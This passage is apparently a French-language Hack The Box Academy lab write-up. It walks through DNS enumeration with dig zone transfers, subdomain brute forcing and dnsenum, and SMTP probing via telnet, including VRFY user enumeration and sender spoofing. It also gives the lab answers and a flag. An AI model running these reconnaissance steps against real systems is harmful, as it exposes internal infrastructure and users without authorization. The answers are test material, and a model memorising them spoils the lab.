inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
```

**Mon analyse :**
- **Nameserver** : `ns.inlanefreight.htb`
- **IP du NS** : `10.129.34.136`
- **TTL** : 604800 secondes (7 jours)

> Si je découvre plusieurs nameservers, je peux les interroger séparément - ils peuvent avoir des configurations différentes
{: .prompt-tip}

#### Détection de version DNS

**Ma commande pour identifier la version :**
```bash
dig CH TXT version.bind 10.129.120.85
```

**Résultat :**
```
;; ANSWER SECTION:
version.bind.       0       CH      TXT     "9.10.6-P1"

;; ADDITIONAL SECTION:
version.bind.       0       CH      TXT     "9.10.6-P1-Debian"
```

**Mon analyse :**
- **Version BIND** : 9.10.6-P1
- **Distribution** : Debian

**Pourquoi c'est important ?**

Avec la version exacte, je peux chercher des **CVE spécifiques** :
- Consulter CVEdetails pour BIND 9.10.6
- Chercher des exploits publics
- Identifier les vulnérabilités connues

> La détection de version ne fonctionne que si l'admin n'a pas désactivé cette option
{: .prompt-warning}

#### Requête ANY pour tous les enregistrements

**Ma commande :**
```bash
dig any inlanefreight.htb @10.129.14.128
```

**Résultat obtenu :**
```
;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
```

**Analyse des enregistrements TXT découverts :**

**SPF (Sender Policy Framework) :**
```
v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all
```

**Informations que j'en tire :**
- **Services mail utilisés** : Mailgun, Google, Outlook, Atlassian
- **Serveurs mail internes** : 10.129.124.8, 10.129.127.2, 10.129.42.106
- **Politique SPF** : `~all` = softfail (emails d'autres serveurs marqués comme suspects)

**Vérifications de domaine :**
- **Atlassian** : L'entreprise utilise Jira/Confluence
- **Microsoft** : Validation Office 365 (`MS=ms97310371`)

> Les enregistrements TXT révèlent l'écosystème complet de services tiers utilisés par l'entreprise
{: .prompt-info}

### Zone Transfer (AXFR) - La vulnérabilité critique

#### Comprendre le zone transfer

**AXFR (Asynchronous Full Transfer Zone)** permet de synchroniser des zones DNS entre serveurs (primaire → secondaire).

**Fonctionnement normal :**
1. Le serveur secondaire interroge le SOA du primaire
2. Comparaison des numéros de série
3. Si différent, transfert complet de la zone

**Le problème de sécurité :**

Si `allow-transfer` est mal configuré, **n'importe qui** peut demander un zone transfer et obtenir :
- **Tous les sous-domaines**
- **Toutes les IPs**
- **L'architecture complète**

#### Exploitation du zone transfer

**Ma commande d'attaque :**
```bash
dig axfr inlanefreight.htb @10.129.14.128
```

**Résultat complet obtenu :**
```
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
internal.inlanefreight.htb. 604800 IN   A       10.129.1.6
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
```

**Mon analyse de la récolte :**

| Sous-domaine | IP | Rôle probable |
|--------------|-----|---------------|
| app.inlanefreight.htb | 10.129.18.15 | Application web |
| internal.inlanefreight.htb | 10.129.1.6 | **Zone interne !** |
| mail1.inlanefreight.htb | 10.129.18.201 | Serveur mail |
| ns.inlanefreight.htb | 10.129.34.136 | Nameserver |

> La découverte d'un sous-domaine "internal" est un jackpot - je peux maintenant faire un zone transfer sur cette zone interne !
{: .prompt-danger}

#### Zone transfer sur le domaine interne

**Ma commande pour aller plus loin :**
```bash
dig axfr internal.inlanefreight.htb @10.129.14.128
```

**Résultat - L'infrastructure interne révélée :**
```
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN   TXT     "MS=ms97310371"
internal.inlanefreight.htb. 604800 IN   TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN   TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN   NS      ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb. 604800 IN A     10.129.34.16
dc2.internal.inlanefreight.htb. 604800 IN A     10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A   10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A      10.129.34.136
vpn.internal.inlanefreight.htb. 604800 IN A     10.129.1.6
ws1.internal.inlanefreight.htb. 604800 IN A     10.129.1.34
ws2.internal.inlanefreight.htb. 604800 IN A     10.129.1.35
wsus.internal.inlanefreight.htb. 604800 IN A    10.129.18.2
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
```

**Mon analyse complète de l'infrastructure interne :**

| Hôte | IP | Rôle | Criticité |
|------|-----|------|-----------|
| **dc1.internal** | 10.129.34.16 | Contrôleur de domaine 1 | **CRITIQUE** |
| **dc2.internal** | 10.129.34.11 | Contrôleur de domaine 2 | **CRITIQUE** |
| **vpn.internal** | 10.129.1.6 | Serveur VPN | **Haute** |
| **wsus.internal** | 10.129.18.2 | Windows Server Update Services | Haute |
| **ws1, ws2.internal** | 10.129.1.34, 10.129.1.35 | Workstations | Moyenne |
| **mail1.internal** | 10.129.18.200 | Serveur mail interne | Haute |

**Ce que cette découverte m'apporte :**

1. **Contrôleurs de domaine identifiés** → Cibles principales pour le pentest
2. **Serveur VPN** → Point d'entrée potentiel
3. **WSUS** → Possibilité d'attaques man-in-the-middle sur les mises à jour
4. **Workstations** → Cibles pour phishing ou lateral movement

> Un seul zone transfer a révélé TOUTE l'infrastructure interne, y compris les contrôleurs de domaine Active Directory
{: .prompt-danger}

### Brute force de sous-domaines

#### Technique avec une wordlist

**Ma commande bash pour brute-forcer :**
```bash
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

**Résultats découverts :**
```
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
```

**Mon analyse de la commande :**
- Boucle sur chaque sous-domaine de la wordlist
- Interroge le DNS pour `$sub.inlanefreight.htb`
- Filtre les lignes de commentaire et SOA
- Garde uniquement les résultats positifs
- Sauvegarde dans `subdomains.txt`

#### Automatisation avec DNSenum

**Ma commande avec DNSenum :**
```bash
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

**Options utilisées :**
- `--dnsserver` : Serveur DNS cible
- `--enum` : Énumération standard
- `-p 0` : Pas de scan de Google
- `-s 0` : Pas de scraping
- `-o` : Fichier de sortie
- `-f` : Wordlist à utiliser

**Résultat obtenu :**
```
dnsenum VERSION:1.2.6

-----   inlanefreight.htb   -----

Host's addresses:
__________________

Name Servers:
______________

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136

Mail (MX) Servers:
___________________

Trying Zone Transfers and getting Bind Versions:
_________________________________________________

Trying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ...
AXFR record query failed: no nameservers

Brute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:
_______________________________________________________________________________________________________

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136
mail1.inlanefreight.htb.                 604800   IN    A        10.129.18.201
app.inlanefreight.htb.                   604800   IN    A        10.129.18.15
```

**Mon observation :** DNSenum tente automatiquement un **zone transfer** avant de passer au brute force. C'est plus efficace !

### Ce que je retiens sur l'énumération DNS

#### Méthodologie complète

**Mon workflow systématique :**

1. **Requête NS** → Identifier tous les nameservers
2. **Détection de version** → Chercher des CVE spécifiques
3. **Requête ANY** → Récolter tous les enregistrements disponibles
4. **Zone transfer (AXFR)** → Tenter sur tous les nameservers découverts
5. **Brute force** → Si AXFR échoue, utiliser des wordlists
6. **Zones internes** → Répéter AXFR sur les sous-domaines "internal", "intranet", "corp"
7. **Analyse des TXT** → Identifier les services tiers et serveurs mail

#### Vulnérabilités DNS les plus critiques

**Classement par gravité :**

| Vulnérabilité | Impact | Facilité d'exploitation |
|---------------|--------|-------------------------|
| **Zone transfer non restreint** | Carte complète de l'infra | Triviale (une commande dig) |
| **Sous-domaines internes exposés** | Accès aux ressources internes | Facile |
| **Version BIND vulnérable** | RCE potentiel | Variable selon CVE |
| **SPF/DMARC mal configurés** | Usurpation d'emails | Facile |
| **Recursion ouverte** | Amplification DDoS | Facile |

#### Commandes essentielles

**Aide-mémoire que j'utilise :**
```bash
# Requêtes de base
dig ns domain.com @dns-server
dig any domain.com @dns-server
dig soa domain.com @dns-server

# Détection de version
dig CH TXT version.bind dns-server

# Zone transfer
dig axfr domain.com @dns-server
dig axfr internal.domain.com @dns-server

# Brute force manuel
for sub in $(cat wordlist.txt); do 
    dig $sub.domain.com @dns-server | grep -v ';' | grep $sub
done

# Avec DNSenum
dnsenum --dnsserver dns-server --enum -f wordlist.txt domain.com
```

> Le DNS est souvent la porte d'entrée vers la découverte de l'infrastructure interne complète
{: .prompt-tip}

---

**Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.**

On me demande d'énumérer le **FQDN** de `inlanefreight.htb` donc nous allons le faire avec la commande `dig`

```bash
└──╼ [★]$ dig ns inlanefreight.htb @10.129.186.109

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> ns inlanefreight.htb @10.129.186.109
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 33394
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 29d965d2220045d2010000006923063c3181b4f3349f8693 (good)
;; QUESTION SECTION:
;inlanefreight.htb.		IN	NS

;; ANSWER SECTION:
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1

;; Query time: 43 msec
;; SERVER: 10.129.186.109#53(10.129.186.109) (UDP)
;; WHEN: Sun Nov 23 07:03:56 CST 2025
;; MSG SIZE  rcvd: 107
```

Nous voyons le dns du serveur qui est `ns.inlanefreight.htb`

**Réponse :** `ns.inlanefreight.htb`

**Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...})**

Maintenant nous devons faire un transfer et pour ceci nous allons utiliser encore la commande `dig` mais avec `axfr` pour des transfert cette fois ci

```bash
└──╼ [★]$ dig axfr inlanefreight.htb @10.129.186.109

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr inlanefreight.htb @10.129.186.109
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.18.15
dev.inlanefreight.htb.	604800	IN	A	10.12.0.1
internal.inlanefreight.htb. 604800 IN	A	10.129.1.6
mail1.inlanefreight.htb. 604800	IN	A	10.129.18.201
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 46 msec
;; SERVER: 10.129.186.109#53(10.129.186.109) (TCP)
;; WHEN: Sun Nov 23 07:21:44 CST 2025
;; XFR size: 11 records (messages 1, bytes 560)
```

Parfait nous voyons plusieurs sous domaines tel que

- app.inlanefreight.htb
- dev.inlanefreight.htb
- internal.inlanefreight.htb
- mail1.inlanefreight.htb
- ns.inlanefreight.htb

Mais nous ce qui nous intéresse le plus c'est `internal` car c'est leur réseau principal "interne"

Donc nous pouvons refaire la même commande mais en spécifiant `internal.inlanefreight.htb`

```bash
└──╼ [★]$ dig axfr internal.inlanefreight.htb @10.129.186.109

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr internal.inlanefreight.htb @10.129.186.109
;; global options: +cmd
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN	TXT	"MS=ms97310371"
internal.inlanefreight.htb. 604800 IN	TXT	"HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}"
internal.inlanefreight.htb. 604800 IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN	NS	ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb.	604800 IN A	10.129.34.16
dc2.internal.inlanefreight.htb.	604800 IN A	10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A	10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A	127.0.0.1
vpn.internal.inlanefreight.htb.	604800 IN A	10.129.1.6
ws1.internal.inlanefreight.htb.	604800 IN A	10.129.1.34
ws2.internal.inlanefreight.htb.	604800 IN A	10.129.1.35
wsus.internal.inlanefreight.htb. 604800	IN A	10.129.18.2
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 160 msec
;; SERVER: 10.129.186.109#53(10.129.186.109) (TCP)
;; WHEN: Sun Nov 23 07:22:49 CST 2025
;; XFR size: 15 records (messages 1, bytes 677)
```

Nous avons la réponse !

**Réponse :** `HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}`

**What is the IPv4 address of the hostname DC1?**

Dans la commande faite juste avant nous voyons cette ligne

```bash
dc1.internal.inlanefreight.htb.	604800 IN A	10.129.34.16
```

**Réponse :** `10.129.34.16`

**What is the FQDN of the host where the last octet ends with "x.x.x.203"?**

Bon alors cette question était un peu compliqué car il fallait changer de wordlist car ça ne marchait pas et aussi il fallait tester les autres sous domaines tel que `mail1` ou `dev` et c'est en faisant le tout avec l'outil `dnsenum` que ça m'a donné la réponse:

```bash
└──╼ [★]$ dnsenum --dnsserver 10.129.186.109 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
dnsenum VERSION:1.2.6

-----   dev.inlanefreight.htb   -----


Host's addresses:
__________________



Name Servers:
______________

ns.inlanefreight.htb.                    604800   IN    A         127.0.0.1


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 2.

Trying Zone Transfer for dev.inlanefreight.htb on ns.inlanefreight.htb ... 
AXFR record query failed: no nameservers


Brute forcing with /opt/useful/seclists/Discovery/DNS/fierce-hostlist.txt:
___________________________________________________________________________

dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6
ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1
win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203


Launching Whois Queries:
_________________________



dev.inlanefreight.htb_____________________



Performing reverse lookup on 0 ip addresses:
_____________________________________________


0 results out of 0 IP addresses.


dev.inlanefreight.htb ip blocks:
_________________________________


done.
```

**Réponse :** `win2k.dev.inlanefreight.htb`

---

## SMTP (Simple Mail Transfer Protocol)

### Comprendre le protocole SMTP

**SMTP (Simple Mail Transfer Protocol)** est le protocole utilisé pour **envoyer des emails** sur un réseau IP. Il fonctionne en mode client-serveur.

> **Pour les débutants :** SMTP est comme le service postal d'Internet - il s'occupe uniquement de l'envoi des emails, pas de leur réception (c'est le rôle de POP3/IMAP).
{: .prompt-info}

**Architecture typique :**
- **SMTP** : Envoi d'emails
- **IMAP/POP3** : Réception et lecture d'emails

**Particularité intéressante :** SMTP peut être utilisé entre deux serveurs SMTP, où un serveur agit comme client pour transférer les emails.

### Ports SMTP

**Tableau des ports utilisés :**

| Port | Usage | Chiffrement |
|------|-------|-------------|
| **25** | Port SMTP standard | Non chiffré (plaintext) |
| **587** | Soumission mail authentifiée | STARTTLS (chiffrement optionnel) |
| **465** | SMTP sur SSL/TLS | Chiffré dès la connexion |

**Mon observation sur le port 587 :**

Ce port utilise la commande **STARTTLS** pour passer d'une connexion **plaintext** à une connexion **chiffrée** après l'authentification. C'est plus sécurisé que le port 25 qui transmet tout en clair.

> Sans chiffrement (port 25), toutes les commandes, données et informations d'authentification sont visibles en clair sur le réseau
{: .prompt-danger}

### Architecture de transmission d'email

#### Les différents agents impliqués

**Flux complet d'un email :**
```
Client (MUA) → Submission Agent (MSA) → Open Relay (MTA) → Mail Delivery Agent (MDA) → Mailbox (POP3/IMAP)
```

**Tableau des composants :**

| Agent | Nom complet | Rôle | Importance en pentest |
|-------|-------------|------|----------------------|
| **MUA** | Mail User Agent | Client email (Thunderbird, Outlook) | Point de départ de l'email |
| **MSA** | Mail Submission Agent | Vérifie la validité et l'origine | Aussi appelé "Relay server" |
| **MTA** | Mail Transfer Agent | Envoie et reçoit les emails | **Cible pour Open Relay Attack** |
| **MDA** | Mail Delivery Agent | Transfère vers la mailbox du destinataire | Livraison finale |

**Mon analyse du MSA (Relay server) :**

Le MSA vérifie l'origine de l'email pour soulager le MTA. C'est ici qu'une mauvaise configuration peut créer une vulnérabilité **Open Relay** que j'exploiterai plus tard.

#### Fonctionnement du transfert

**Ce que j'ai compris du processus :**

1. Le **MUA** (client) convertit l'email en **header** et **body**
2. Upload vers le serveur SMTP
3. Le **MTA** vérifie :
   - Taille de l'email
   - Détection de spam
4. Stockage temporaire
5. Recherche DNS de l'IP du serveur mail destinataire
6. Envoi vers le serveur SMTP de destination
7. Réassemblage des paquets
8. Le **MDA** transfère vers la mailbox du destinataire

### Problèmes de sécurité inhérents à SMTP

#### Deux faiblesses majeures

**Problème 1 : Pas de confirmation de livraison fiable**

**Ce que j'ai compris :** Le protocole SMTP ne retourne **pas de confirmation** utilisable de la livraison d'un email. On reçoit seulement un message d'erreur en anglais avec le header de l'email non délivré.

**Problème 2 : Pas d'authentification de l'expéditeur**

**Impact critique que j'ai identifié :**
- Aucune authentification lors de l'établissement de connexion
- L'adresse de l'expéditeur est **non fiable**
- Les **Open SMTP Relays** sont abusés pour envoyer du spam en masse
- **Mail spoofing** : Utilisation d'adresses d'expéditeur arbitraires et fausses

> Sans authentification, n'importe qui peut prétendre être n'importe qui en envoyant un email
{: .prompt-danger}

#### Solutions de sécurité modernes

**Protections mises en place :**

| Technologie | Fonction | But |
|-------------|----------|-----|
| **DKIM** | DomainKeys Identified Mail | Vérification de l'authenticité du domaine |
| **SPF** | Sender Policy Framework | Validation du serveur mail expéditeur |
| **DMARC** | Domain-based Message Authentication | Protection contre le spam et spoofing |

### ESMTP (Extended SMTP)

#### Évolution vers ESMTP

**Ce que j'ai appris :** Quand on parle de "SMTP" aujourd'hui, on parle généralement d'**ESMTP** (Extended SMTP).

**Améliorations d'ESMTP :**

1. **TLS/SSL** : Chiffrement de la connexion après la commande `EHLO` et `STARTTLS`
2. **AUTH PLAIN** : Extension d'authentification utilisable en toute sécurité une fois la connexion chiffrée
3. Protection des credentials durant la transmission

**Séquence de sécurisation :**
```
EHLO → STARTTLS → Connexion SSL/TLS établie → AUTH PLAIN (sécurisé)
```

> Une fois STARTTLS exécuté, toute la connexion est chiffrée, y compris l'authentification
{: .prompt-tip}

### Configuration par défaut de Postfix

#### Analyse du fichier main.cf

**Ma commande pour voir la config :**
```bash
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

**Configuration exemple obtenue :**
```
smtpd_banner = ESMTP Server 
biff = no
append_dot_mydomain = no
readme_directory = no
compatibility_level = 2
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
myhostname = mail1.inlanefreight.htb
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
smtp_generic_maps = hash:/etc/postfix/generic
mydestination = $myhostname, localhost 
masquerade_domains = $myhostname
mynetworks = 127.0.0.0/8 10.129.0.0/16
mailbox_size_limit = 0
recipient_delimiter = +
smtp_bind_address = 0.0.0.0
inet_protocols = ipv4
smtpd_helo_restrictions = reject_invalid_hostname
home_mailbox = /home/postfix
```

**Mon analyse des paramètres importants :**

| Paramètre | Valeur | Signification |
|-----------|--------|---------------|
| `myhostname` | mail1.inlanefreight.htb | FQDN du serveur mail |
| `mydestination` | $myhostname, localhost | Domaines pour lesquels ce serveur est destination finale |
| `mynetworks` | 127.0.0.0/8 10.129.0.0/16 | **Réseaux autorisés à relayer** |
| `smtp_bind_address` | 0.0.0.0 | Écoute sur toutes les interfaces |
| `inet_protocols` | ipv4 | IPv4 uniquement |

> Le paramètre `mynetworks` est CRITIQUE : il définit qui peut utiliser ce serveur comme relay
{: .prompt-warning}

### Commandes SMTP essentielles

#### Tableau des commandes principales

**Commandes que je dois connaître :**

| Commande | Fonction | Usage en pentest |
|----------|----------|------------------|
| `AUTH PLAIN` | Authentification du client | Tester les credentials |
| `HELO` | Identification du client | Initier la session |
| `EHLO` | HELO étendu (ESMTP) | Découvrir les fonctionnalités supportées |
| `MAIL FROM` | Spécifier l'expéditeur | Usurper l'identité |
| `RCPT TO` | Spécifier le destinataire | Tester les utilisateurs valides |
| `DATA` | Début de transmission de l'email | Envoyer le contenu |
| `RSET` | Annuler la transmission | Recommencer sans se reconnecter |
| `VRFY` | **Vérifier si une mailbox existe** | **Énumération d'utilisateurs** |
| `EXPN` | Vérifier mailbox (alternatif) | Énumération d'utilisateurs |
| `NOOP` | Demander une réponse | Garder la connexion vivante |
| `QUIT` | Terminer la session | Fermeture propre |

> VRFY et EXPN sont les commandes les plus intéressantes pour l'énumération d'utilisateurs
{: .prompt-tip}

### Interaction manuelle avec SMTP via Telnet

#### Connexion initiale et EHLO

**Ma commande pour me connecter :**
```bash
telnet 10.129.14.128 25
```

**Session obtenue :**
```
Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server 

HELO mail1.inlanefreight.htb

250 mail1.inlanefreight.htb

EHLO mail1

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```

**Mon analyse des capacités ESMTP découvertes :**

| Capacité | Signification |
|----------|---------------|
| `PIPELINING` | Envoi de plusieurs commandes sans attendre la réponse |
| `SIZE 10240000` | Taille max d'email : ~10 MB |
| `ETRN` | Extended Turn (rarement utilisé) |
| `ENHANCEDSTATUSCODES` | Codes de statut détaillés |
| `8BITMIME` | Support des caractères 8-bit |
| `DSN` | Delivery Status Notifications |
| `SMTPUTF8` | Support UTF-8 dans les emails |
| `CHUNKING` | Transfert par morceaux |

> La commande EHLO révèle toutes les fonctionnalités supportées par le serveur SMTP
{: .prompt-info}

### Énumération d'utilisateurs avec VRFY

#### Technique d'énumération

**Ma tentative d'énumération :**
```bash
telnet 10.129.14.128 25
```

**Session de test :**
```
Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server 

VRFY root

252 2.0.0 root

VRFY cry0l1t3

252 2.0.0 cry0l1t3

VRFY testuser

252 2.0.0 testuser

VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa

252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

**Mon observation CRITIQUE :**

Le serveur répond **252 2.0.0** pour **TOUS** les utilisateurs, même ceux qui n'existent pas !

**Code de réponse 252 :** "Cannot VRFY user, but will accept message and attempt delivery"

> Ce serveur est mal configuré : il confirme l'existence de n'importe quel utilisateur, même inexistants. Ne jamais se fier uniquement aux outils automatisés !
{: .prompt-warning}

**Pourquoi c'est un problème pour l'énumération ?**

Le serveur utilise probablement une configuration anti-énumération qui retourne toujours **252** pour ne pas révéler les utilisateurs existants. Je dois donc trouver une autre méthode.

**Liste des codes de réponse SMTP utiles :**

| Code | Signification | Usage |
|------|---------------|-------|
| 220 | Service ready | Connexion établie |
| 250 | Requested action completed | Succès |
| 251 | User not local, will forward | L'utilisateur existe ailleurs |
| 252 | Cannot verify, but will try | Anti-énumération |
| 354 | Start mail input | Prêt à recevoir le DATA |
| 421 | Service not available | Serveur indisponible |
| 450 | Mailbox unavailable | Mailbox temporairement indisponible |
| 550 | Mailbox unavailable | **Utilisateur n'existe PAS** |
| 551 | User not local | Utilisateur sur un autre serveur |

Pour la liste complète des codes : [SMTP Response Codes](https://www.greenend.org.uk/rjk/tech/smtpreplies.html)

### Envoi d'email via Telnet

#### Simuler un client email manuellement

**Ma session complète d'envoi d'email :**
```bash
telnet 10.129.14.128 25
```

**Commands et résultats :**
```
Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server

EHLO inlanefreight.htb

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING

MAIL FROM: <cry0l1t3@inlanefreight.htb>

250 2.1.0 Ok

RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure

250 2.1.5 Ok

DATA

354 End data with <CR><LF>.<CR><LF>

From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don't work. 
Did you make any changes there?
.

250 2.0.0 Ok: queued as 6E1CF1681AB

QUIT

221 2.0.0 Bye
Connection closed by foreign host.
```

**Mon analyse du processus d'envoi :**

**Étape 1 : EHLO** → Identification et découverte des capacités

**Étape 2 : MAIL FROM** → Déclaration de l'expéditeur
- **Observation** : Je peux mettre **n'importe quelle adresse** ici (spoofing)

**Étape 3 : RCPT TO** → Déclaration du destinataire
- **Option NOTIFY** : Demande de notification de succès/échec

**Étape 4 : DATA** → Début du contenu
- Le serveur attend le contenu jusqu'à un point seul sur une ligne (`.`)

**Étape 5 : Header + Body** → Contenu de l'email
```
From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
[ligne vide obligatoire]
Corps du message
.
```

**Étape 6 : Point seul** → Fin de DATA
- Le `.` sur une ligne seule indique la fin du message

**Étape 7 : QUIT** → Fermeture de session

> Toutes ces commandes sont exactement ce que font Thunderbird, Gmail, Outlook en arrière-plan quand vous envoyez un email
{: .prompt-info}

#### Utilisation via un proxy web

**Si je dois passer par un proxy web :**
```
CONNECT 10.129.14.128:25 HTTP/1.0
```

Cette commande demande au proxy de se connecter au serveur SMTP pour moi.

### Headers d'email et informations forensiques

#### Importance du header d'email

**Ce que contient un header d'email :**
- **Expéditeur et destinataire**
- **Horodatage** de l'envoi et de la réception
- **Stations traversées** pendant le transit
- **Format et contenu** du message
- Informations sur l'**expéditeur et destinataire**

**Informations obligatoires :**
- Informations sur l'expéditeur
- Date de création de l'email

**Informations optionnelles :**
- CC, BCC
- Reply-To
- Message-ID
- References

**Mon observation :** Le header d'email est défini par [RFC 5322](https://www.rfc-editor.org/rfc/rfc5322) et est une mine d'or pour l'analyse forensique et le tracking d'attaques par phishing.

> Le header ne contient AUCUNE information nécessaire à la livraison technique - ces infos sont dans le protocole de transmission
{: .prompt-info}

### Configuration dangereuse : Open Relay

#### Comprendre le problème Open Relay

